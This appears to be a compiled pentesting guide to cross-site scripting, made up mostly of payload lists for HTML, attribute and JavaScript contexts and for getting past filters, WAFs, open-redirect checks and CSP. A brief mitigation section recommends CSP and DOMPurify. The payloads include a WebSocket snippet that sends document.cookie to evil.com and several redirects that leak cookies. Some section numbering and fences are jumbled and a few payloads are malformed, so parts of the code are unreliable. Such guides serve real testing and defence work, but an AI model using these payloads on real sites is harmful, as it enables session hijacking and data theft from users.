# Comprehensive Guide on Cross-Site Scripting (XSS) and Its Bypasses
Cross-Site Scripting (XSS) is a widespread vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This guide covers the types of XSS, methodologies for detection and exploitation, contexts of injection, and advanced techniques for bypassing protections.

1. Introduction to XSS
XSS attacks enable attackers to inject malicious scripts into web pages. These scripts can execute in the context of a user's browser, allowing attackers to steal information, hijack sessions, or perform actions on behalf of the user.

1.1 Types of XSS
Stored XSS: The malicious script is permanently stored on the target server, such as in a database or comment field.
Reflected XSS: The malicious script is reflected off a web server, typically via a URL query parameter.
DOM-Based XSS: The vulnerability exists in the client-side code rather than the server-side code, and the attack payload is executed as a result of modifying the DOM environment.

2. Methodology for Detecting XSS
2.1 Identify Injection Points
   
Check if any value you control (parameters, path, headers, cookies) is reflected in the HTML or used by JavaScript code.

# Determine Reflection Context

Raw HTML: Can you create new HTML tags or use attributes/events that support JavaScript?


Inside HTML Tag: Can you exit to raw HTML or create events/attributes to execute JavaScript?


Inside JavaScript Code: Can you escape the <script> tag or string context to execute arbitrary JavaScript?


4. Contexts for XSS Injection
Raw HTML Context
When your input is reflected in the raw HTML of a page, you can exploit it by injecting HTML tags that execute JavaScript. Common tags include:
```
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<svg onload=alert(1)>
```
3.2 Inside HTML Tag Attributes
If your input is reflected within an attribute value, consider the following approaches:

Escape Attribute and Tag: 
```
"><img src=x onerror=alert(1)>
```

Event Handlers: If escaping the tag is not possible, use attributes like onfocus, onclick: " autofocus onfocus=alert(1) x="
JavaScript Protocol: If within href, use javascript:: href="javascript:alert(1)"
3.3 Inside JavaScript Code
If the input is reflected within JavaScript code, you need to break out of the string or the <script> tag to execute arbitrary code:

Escape String: "; alert(1); "
Template Literals: If input is in a template literal: `${alert(1)}`
4. Advanced Techniques and Bypasses
4.1 Content Security Policy (CSP) Bypass
CSP is a security measure that helps prevent XSS by specifying trusted content sources. However, it can be bypassed if not correctly configured.


4.2 Polyglot XSS
Polyglot payloads can function in multiple contexts (HTML, JS, CSS) to bypass input filters.

4.2.1 Example Polyglot Payload
```
"><svg onload=alert(1)><script>alert(1)</script>
4.3 Dangling Markup - HTML Scriptless Injection
```
If you cannot create executing HTML tags, you might abuse dangling markup, which involves placing incomplete tags that break the current HTML context.

4.3.1 Example Dangling Markup
```
<a href="/">Click here</a><b 
<script>alert(1)</script>
```
4.4 JSON-based XSS
When web applications parse JSON data and directly insert it into the DOM without proper sanitization, it can lead to XSS.

4.4.1 Example JSON-based XSS
```
{"name": "<img src=x onerror=alert(1)> "}
```
4.5 Bypassing Filters
Using techniques like UTF-7 encoding, breaking out of existing tags, or leveraging uncommon payloads.

Example UTF-7 Encoding
```
<iframe src="data:text/html;charset=utf-7,%2BADw-script%2BAD4-alert('XSS')%2BADw-/script%2BAD4-"></iframe>
```
4.6 Using HTML Entities
Encoding the payload using HTML entities to bypass filters that block certain characters.

4.6.1 Example HTML Entities
```
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
4.7 Null Byte Injection
Using null bytes to bypass filters or terminate strings early.

4.7.1 Example Null Byte Injection
```
<img src="x" onerror="alert(1)";%00" src="y">
<img src="x" onerror="alert(1)%00" src="y">
<svg onload="alert(1)%00">
<iframe src="javascript:alert(1)%00"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==%00"></iframe>
<a href="javascript:alert(1)%00">Click me</a>
<form action="javascript:alert(1)%00" method="post"><input type="submit"></form>
<img src="x" onerror="alert(1)";%00" src="y">
```
4.8 Case Variation
Altering the case of HTML tags and attributes to bypass case-sensitive filters.

Obfuscation Techniques
```
// Obfuscation with white spaces
<scr\0ipt>alert(1)</scr\0ipt>

// Breaking up keywords
<scri/*foo*/pt>alert(1)</scri/*foo*/pt>

// Using concatenation
<scr\+ipt>alert(1)</scr\+ipt>
```

Unexpected Input Variations
```
// Inline event handlers
<svg><a href="javascript:alert(1)">click</a></svg>

// Injecting into attributes
<input type="text" value="``><svg onload=alert(1)>">
```

4.8.1 Example Case Variation
```
<Svg OnloAd=alert(1)>
```
4.9 Using Backticks in JavaScript
Bypassing filters by using backticks in JavaScript for template literals.

4.9.1 Example Using Backticks
```
<script>let a = `alert(1)`</script>
```
4.10 Chained XSS
Combining multiple injection points to achieve a successful XSS attack.

4.10.1 Example Chained XSS
Injecting part of the payload in one input and another part in a different input to form a complete attack.

5. Exploiting DOM XSS
DOM XSS occurs when a script on the page modifies the DOM based on user input, potentially leading to the execution of malicious scripts.

5.1 Finding and Exploiting DOM XSS
Identify Sinks: Look for functions or methods (e.g., innerHTML, document.write) that render user-controlled input.
Control Flow: Understand how user input flows through the application to these sinks.
Payload Construction: Craft payloads that exploit these sinks.
5.1.1 Example DOM XSS Payload
```
<input oninput="document.getElementById('output').innerHTML = this.value">
<input value="<img src=x onerror=alert(1)>">
```
6. Debugging Client-Side JavaScript
When working with complex XSS payloads, debugging client-side JavaScript can help understand how input is processed and reflected.

6.1 Tools for Debugging
Browser Developer Tools: Use the console, breakpoints, and step through the JavaScript code to understand the application flow and find XSS injection points.
7. Mitigations and Best Practices
7.1 Input Validation and Sanitization
Ensure all user inputs are validated and sanitized before being processed or rendered.

Bypassing Filters with HTML Entities
```
<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
<img src=x onerror=& #x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

Bypassing Filters with Null Bytes
Null byte injection can terminate strings early or bypass certain filters by injecting null characters.

```
<img src="x" onerror="alert(1)";%00" src="y">
```

# Open Redirect Exploits

Basic Open Redirect to XSS

// Basic payload, JavaScript code is executed after "javascript:"
javascript:alert(1)

Bypassing "javascript" Word Filter with CRLF
```
java%0d%0ascript%0d%0a:alert(0)
```
Abusing Bad Subdomain Filter
```
javascript://sub.domain.com/%0Aalert(1)
```

JavaScript with "://"
```
javascript://%250Aalert(1)
```

```
// Variation with query
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
```
Other Variations
```
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
Open Redirect by Uploading SVG Files
Using SVG files to perform open redirects can be effective, especially when the application allows file uploads.
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
```

Client-Side Prototype Pollution to XSS
Prototype pollution in JavaScript occurs when an attacker can modify the properties of Object.prototype. This can lead to XSS if these properties are used in sensitive operations.

// Prototype pollution payload
Object.prototype.polluted = 'polluted';
If the application uses a polluted object property in a dangerous way, this can lead to XSS:

```
var obj = {};
alert(obj.polluted); // Outputs: polluted
```

# How to Bypass Internal Filtering for XSS
Bypassing internal filtering mechanisms such as Web Application Firewalls (WAFs) and input sanitization requires a deep understanding of how these filters operate and the techniques that can be used to circumvent them. This guide provides an in-depth look at various methods to bypass internal filtering mechanisms for XSS attacks.

Internal filters and WAFs are designed to prevent malicious inputs by inspecting, sanitizing, or blocking suspicious content. Common filtering techniques include:

Blacklisting: Blocking known malicious patterns or keywords.
Whitelisting: Allowing only specific safe inputs.
Encoding: Converting special characters to their HTML entities.
Normalization: Simplifying input to a consistent form for easier inspection.

Techniques for Bypassing Filters
2.1 Encoding and Decoding
Using various encoding methods can help bypass filters that don't decode inputs before inspection.

URL Encoding
```
%3Cscript%3Ealert(1)%3C/script%3E
```
Double URL Encoding
```
%253Cscript%253Ealert(1)%253C/script%253E
```
HTML Entities
```
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```
Unicode Encoding
```
\u003Cscript\u003Ealert(1)\u003C/script\u003E
```
Case Variation
Altering the case of HTML tags and attributes can bypass filters that are case-sensitive.
```
<ScRiPt>alert(1)</ScRiPt>
<Img sRc=x OnErRoR=alert(1)>
```
Comment Insertion
Inserting comments within the payload can break up patterns that the filter is looking for.
```
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
```
Using Null Bytes
Null byte injection can terminate strings early or bypass certain filters.
```
<img src="x" onerror="alert(1)%00" src="y">
<svg onload="alert(1)%00">
```
Breaking Up Keywords
```
<scri/*foo*/pt>alert(1)</scri/*foo*/pt>
```
Using Concatenation
```
<scr\+ipt>alert(1)</scr\+ipt>
```
Leveraging Browser Parsing Quirks
Different browsers may interpret malformed HTML or JavaScript in ways that can be exploited.
```
<scr<script>ipt>alert(1)</scr</script>ipt>
```
Incomplete Tags
```
<svg><a href="javascript:alert(1)">click</a></svg>
```
Inserting White Spaces and Line Breaks
Using white spaces and line breaks to bypass filters.

```
<scr\0ipt>alert(1)</scr\0ipt>
<svg
onload=alert(1)>
```
Combining Techniques
Combining multiple bypass techniques to create a payload that evades detection.

```
<scr\0ipt>alert(1)</scr\0ipt>
%3Cscript%3E%61lert(1)%3C/script%3E
<scr\+ipt>alert(1)%00</scr\+ipt>
```
3. Real-World Examples
3.1 URL Encoding and Decoding
Using URL encoding to bypass filters that do not decode inputs before inspection.


Combining case variation and comment insertion to bypass case-sensitive filters.

```
<ScRiPt>alert(1)</ScRiPt>
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
```
Null Byte Injection
Using null bytes to terminate strings early or bypass certain filters.

```
<img src="x" onerror="alert(1)%00" src="y">
<svg onload="alert(1)%00">
```
Obfuscation and Concatenation
Using obfuscation and concatenation to avoid detection by filters.

```
<scri/*foo*/pt>alert(1)</scri/*foo*/pt>
<scr\+ipt>alert(1)</scr\+ipt>
```


# Understanding CSP
CSP works by allowing website owners to define a whitelist of trusted sources for content such as scripts, styles, images, and more. This is done through the Content-Security-Policy HTTP header. Key directives include:

default-src: The default policy for loading content types.
script-src: Defines trusted sources for JavaScript.
style-src: Defines trusted sources for CSS.
img-src: Defines trusted sources for images.
2. Common CSP Misconfigurations
Misconfigured CSP policies are often the root cause of bypasses. Common issues include:

Allowing unsafe-inline or unsafe-eval in script-src.
Overly permissive whitelists.
Failing to cover all possible directives, leaving certain content types unprotected.

# Bypassing CSP

JSONP (JSON with Padding) allows data to be fetched from a different domain using a <script> tag. If the JSONP endpoint is not properly secured, it can be exploited to execute arbitrary JavaScript.

Overly permissive CSP headers, such as those allowing unsafe-inline, can be exploited to run inline scripts directly.
```
<script nonce="random-nonce">alert(1)</script>
```

Inline Script Allowances
When unsafe-inline is allowed, or if there is an oversight allowing inline scripts, attackers can inject their payload directly into inline scripts.

Data URIs
Data URIs can sometimes be used to bypass CSP if they are allowed in the policy.
```
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
```

# Exploiting Script Gadgets
Script gadgets are existing pieces of code on a website that can be exploited to perform unintended actions. This is particularly effective if unsafe-inline or unsafe-eval is used.

Exploitation
Find an existing inline script that can be manipulated.
Inject code that modifies the behavior of the script.

Content Injection via Whitelisted CDNs
If a Content Delivery Network (CDN) is whitelisted, and the attacker can upload content to that CDN, they can inject malicious scripts.

Exploitation
Upload a malicious script to cdn.example.com.
Include the script on the target site:
```
<script src="https://cdn.example.com/malicious.js"></script>
```

Subresource Integrity (SRI) Bypass
SRI is used to ensure that resources hosted on third-party servers have not been tampered with. However, if SRI is not used properly, it can be bypassed.

Exploitation
Host a script on a trusted domain without SRI.
Include the script:
```
<script src="https://trusted.com/script.js"></script>
```
Mutation XSS
Mutation XSS exploits the way browsers handle dynamic content changes. If CSP allows unsafe-inline, attackers can inject payloads that mutate the DOM in unexpected ways.

Exploitation:
```
<div><img src=x onerror="alert(1)"></div>
<script>
document.querySelector('div').innerHTML = '<img src=x onerror="alert(1)">';
</script>
```

Using WebSockets
WebSockets can sometimes be used to exfiltrate data or execute JavaScript if allowed by CSP.

Exploitation:
```
var ws = new WebSocket("wss://evil.com/socket");
ws.onopen = function() {
  ws.send(document.cookie);
};
```

CSP Nonce Reuse
If the CSP nonce is reused or predictable, it can be exploited to run malicious scripts.

Exploitation
Predict or capture the nonce value.
Use the nonce to execute a script:

```
<script nonce="captured-nonce">alert(1)</script>
```

Example of a Secure CSP Header
Here’s an example of a secure CSP header that mitigates most XSS attacks:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random-nonce'; style-src 'self' 'nonce-random-nonce'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

Use Security Libraries
Utilize libraries like DOMPurify to clean HTML inputs and prevent XSS.

 Example DOMPurify Usage

var clean = DOMPurify.sanitize(dirty);
8. References
Pentest-Tools Blog on XSS Attacks
Hacktricks XSS Documentation
Hacktricks on CSP Bypass
This guide provides a comprehensive overview of XSS, various attack scenarios, contexts of injection, advanced techniques, and best practices for mitigation. Understanding these concepts is crucial for both defending against and exploiting XSS vulnerabilities in web applications.
